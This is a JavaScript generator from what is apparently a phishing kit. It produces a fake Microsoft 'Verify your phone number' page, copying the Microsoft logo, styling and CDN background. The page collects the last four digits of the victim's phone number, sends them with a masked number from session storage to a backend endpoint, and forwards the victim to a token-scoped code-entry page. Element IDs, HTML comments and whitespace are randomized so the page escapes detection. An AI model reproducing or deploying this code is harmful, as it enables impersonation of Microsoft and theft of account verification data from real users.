/**
 * Microsoft Phone Input Page Generator
 * Generates dynamic phone number verification page (numinput.html)
 */

const { randomId, randomComment, randomizeWhitespace } = require('./utils/randomizer');

function generateMsPhoneInputPage(token, options = {}) {
    const { randomize = true } = options;

    const ids = {
        userPhoneDisplay: randomize ? randomId('phone') : 'user-phone-display',
        verificationDescription: randomize ? randomId('desc') : 'verification-description',
        phoneInput: randomize ? randomId('input') : 'phone-input',
        phoneError: randomize ? randomId('err') : 'phone-error',
        sendCodeBtn: randomize ? randomId('send') : 'send-code-btn',
        enterCodeLink: randomize ? randomId('link') : 'enter-code-link'
    };

    const html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify your phone number</title>
    ${randomComment()}
    <style>
        body {
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Roboto', 'Helvetica Neue', Arial, sans-serif;
            background-color: #f2f2f2;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            color: #1f1f1f;
            background-image: url('https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg');
            background-size: cover;
        }

        .container {
            background: #ffffff;
            padding: 44px;
            border-radius: 8px;
            box-shadow: 0 2px 14px 0 rgba(0, 0, 0, 0.24);
            width: 440px;
            max-width: 90%;
            text-align: left;
        }

        .logo-container {
            display: flex;
            align-items: center;
            margin-bottom: 8px;
        }

        .ms-logo {
            width: 21px;
            height: 21px;
            margin-right: 8px;
        }

        .logo-text {
            font-size: 15px;
            font-weight: 600;
        }

        .user-phone {
            font-size: 13px;
            color: #605e5c;
            margin-bottom: 24px;
        }

        h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 16px;
        }

        .description {
            color: #605e5c;
            margin-bottom: 24px;
            font-size: 14px;
            line-height: 1.5;
        }

        .input-container {
            margin-bottom: 24px;
        }

        .input-container label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            color: #605e5c;
            font-weight: 600;
        }

        .input-container input {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #c8c6c4;
            border-radius: 4px;
            font-size: 15px;
            transition: all 0.2s;
            box-sizing: border-box;
        }

        .input-container input:focus {
            border-color: #0078d4;
            outline: none;
            box-shadow: 0 0 0 1px #0078d4;
        }

        .input-container input:hover {
            border-color: #0078d4;
        }

        .error-message {
            color: #d13438;
            font-size: 12px;
            margin-top: 8px;
            display: none;
        }

        .error-message.show {
            display: block;
        }

        .button-container {
            text-align: right;
            margin-top: 24px;
        }

        .btn-primary {
            background-color: #0078d4;
            color: white;
            border: none;
            padding: 8px 24px;
            font-size: 15px;
            font-weight: 600;
            border-radius: 2px;
            cursor: pointer;
            transition: all 0.2s;
            min-width: 120px;
        }

        .btn-primary:hover:not(:disabled) {
            background-color: #106ebe;
        }

        .btn-primary:disabled {
            background-color: #e1dfdd;
            color: #605e5c;
            cursor: not-allowed;
        }

        .btn-primary.sending {
            background-color: #0078d4;
            color: white;
        }

        .already-received {
            text-align: center;
            margin-top: 24px;
            color: #605e5c;
            font-size: 14px;
        }

        .already-received a {
            color: #0078d4;
            text-decoration: none;
        }

        .already-received a:hover {
            text-decoration: underline;
        }

        .footer {
            position: fixed;
            bottom: 16px;
            right: 16px;
            display: flex;
            gap: 16px;
            font-size: 12px;
        }

        .footer a {
            color: rgba(255, 255, 255, 0.8);
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    ${randomComment()}
    <div class="container">
        <div class="logo-container">
            <svg class="ms-logo" viewBox="0 0 21 21" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M0 0H9.9V9.9H0V0Z" fill="#F25022" />
                <path d="M11.1 0H21V9.9H11.1V0Z" fill="#7FBA00" />
                <path d="M0 11.1H9.9V21H0V11.1Z" fill="#00A4EF" />
                <path d="M11.1 11.1H21V11.1V21H11.1V11.1Z" fill="#FFB900" />
            </svg>
            <span class="logo-text">Microsoft</span>
        </div>
        <div class="user-phone" id="${ids.userPhoneDisplay}">Loading...</div>
        <h1>Verify your phone number</h1>
        <p class="description" id="${ids.verificationDescription}">We'll send a verification code to your phone number.</p>
        <div class="input-container">
            <label for="${ids.phoneInput}">Last 4 digits of phone number</label>
            <input type="text" id="${ids.phoneInput}" placeholder="e.g. 0086" maxlength="4" inputmode="numeric" pattern="\\d{4}" required>
            <div class="error-message" id="${ids.phoneError}">Please enter the last 4 digits of your phone number</div>
        </div>
        <div class="button-container">
            <button class="btn-primary" id="${ids.sendCodeBtn}" disabled>Send code</button>
        </div>
        <div class="already-received">
            <span>Already received a code? </span>
            <a href="#" id="${ids.enterCodeLink}">Enter it here</a>
        </div>
    </div>
    <div class="footer">
        <a href="#">Terms of use</a>
        <a href="#">Privacy & cookies</a>
        <a href="#">...</a>
    </div>

    <script>
        (function() {
            ${randomComment()}
            function isValidPhoneDigits(val) {
                return /^\\d{4}\$/.test(val);
            }

            const phoneInput = document.getElementById('${ids.phoneInput}');
            const sendCodeBtn = document.getElementById('${ids.sendCodeBtn}');
            const enterCodeLink = document.getElementById('${ids.enterCodeLink}');
            const userPhoneDisplay = document.getElementById('${ids.userPhoneDisplay}');
            const verificationDescription = document.getElementById('${ids.verificationDescription}');
            const phoneError = document.getElementById('${ids.phoneError}');

            const maskedPhone = sessionStorage.getItem('selectedEmail') || '';
            const userPhone = sessionStorage.getItem('userPhone') || '';
            userPhoneDisplay.textContent = userPhone || 'Loading...';

            if (maskedPhone) {
                phoneInput.value = '';
                verificationDescription.textContent = \`We'll send a verification code to \${maskedPhone}. To verify this is your phone number, enter the last 4 digits here.\`;
            }

            phoneInput.addEventListener('input', () => {
                const val = phoneInput.value.trim();
                const isValid = isValidPhoneDigits(val);
                phoneError.classList.remove('show');
                sendCodeBtn.disabled = !isValid;
                if (val && !isValid) {
                    phoneInput.style.borderColor = '#d13438';
                } else if (val && isValid) {
                    phoneInput.style.borderColor = '#0078d4';
                } else {
                    phoneInput.style.borderColor = '#c8c6c4';
                }
            });

            sendCodeBtn.addEventListener('click', async () => {
                const digits = phoneInput.value.trim();
                if (!isValidPhoneDigits(digits)) {
                    phoneError.classList.add('show');
                    phoneInput.focus();
                    return;
                }
                sendCodeBtn.disabled = true;
                sendCodeBtn.textContent = 'Sending...';
                try {
                    const selectedPhone = sessionStorage.getItem('selectedEmail');
                    console.log('🔥 DEBUG: About to send request to backend');
                    console.log('📤 Sending full phone digits to backend:');
                    console.log('🎭 Masked Phone:', selectedPhone);
                    console.log('🔢 Entered digits:', digits);
                    const requestData = {
                        maskedPhone: selectedPhone,
                        phoneDigits: digits
                    };
                    console.log('🔥 DEBUG: Request data:', JSON.stringify(requestData, null, 2));
                    const response = await fetch('/send-verification-code', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(requestData)
                    });
                    console.log('🔥 DEBUG: Response status:', response.status);
                    console.log('🔥 DEBUG: Response headers:', response.headers);
                    const result = await response.json();
                    console.log('🔥 DEBUG: Parsed response:', result);
                    if (result.status === 'success') {
                        console.log('✅ Backend successfully received full phone digits');
                        sendCodeBtn.textContent = 'Code Sent!';
                        sendCodeBtn.classList.add('sending');
                        setTimeout(() => {
                            window.location.href = '/${token}/codeinput';
                        }, 1500);
                    } else {
                        throw new Error(result.message || 'Failed to send verification code');
                    }
                } catch (error) {
                    console.error('Error:', error);
                    phoneError.textContent = error.message || 'An error occurred. Please try again.';
                    phoneError.classList.add('show');
                    sendCodeBtn.disabled = false;
                    sendCodeBtn.textContent = 'Send code';
                    sendCodeBtn.classList.remove('sending');
                }
            });

            enterCodeLink.addEventListener('click', (e) => {
                e.preventDefault();
                if (enterCodeLink.style.pointerEvents === 'auto') {
                    window.location.href = '/${token}/codeinput';
                }
            });
            enterCodeLink.style.pointerEvents = 'none';
            enterCodeLink.style.opacity = '0.5';
            setTimeout(() => phoneInput.focus(), 100);
        })();
    </script>
</body>
</html>`;

    return randomizeWhitespace(html);
}

module.exports = { generateMsPhoneInputPage };
